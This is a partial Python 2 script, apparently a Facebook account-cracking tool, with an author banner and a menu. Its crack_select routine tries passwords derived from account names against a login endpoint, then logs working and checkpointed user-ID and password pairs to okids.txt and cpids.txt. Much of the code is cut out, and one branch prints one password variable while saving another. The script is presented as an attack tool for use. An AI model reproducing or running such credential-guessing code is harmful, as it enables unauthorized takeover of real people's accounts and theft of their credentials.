...
\033[1;92m\n 
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  ____  ____  | || |  _______     | || |     _____    | || |  ________    | || |     ____     | || |  ____  ____  | |
| | |_   ||   _| | || | |_   __ \    | || |    |_   _|   | || | |_   ___ `.  | || |   .'    `.   | || | |_  _||_  _| | |
| |   | |__| |   | || |   | |__) |   | || |      | |     | || |   | |   `. \ | || |  /  .--.  \  | || |   \ \  / /   | |
| |   |  __  |   | || |   |  __ /    | || |      | |     | || |   | |    | | | || |  | |    | |  | || |    \ \/ /    | |
| |  _| |  | |_  | || |  _| |  \ \_  | || |     _| |_    | || |  _| |___.' / | || |  \  `--'  /  | || |    _|  |_    | |
| | |____||____| | || | |____| |___| | || |    |_____|   | || | |________.'  | || |   `.____.'   | || |   |______|   | |
| |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 

\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: Savage-Hridoy
\033[1;92mFb \033[1;93m: Hridoy Vai
...
def log_sel():
	...
	main()
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=King.Hridoy.11')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[Hridoy-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[Hridoy-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;31m[Hridoy-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + 'Hridoy'
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;31m[Hridoy-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #THANKX SHANI BRO
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##THANKX Hridoy BRO
    print 45 * '\033[0m_\033[0m'
    print ''
    print ''
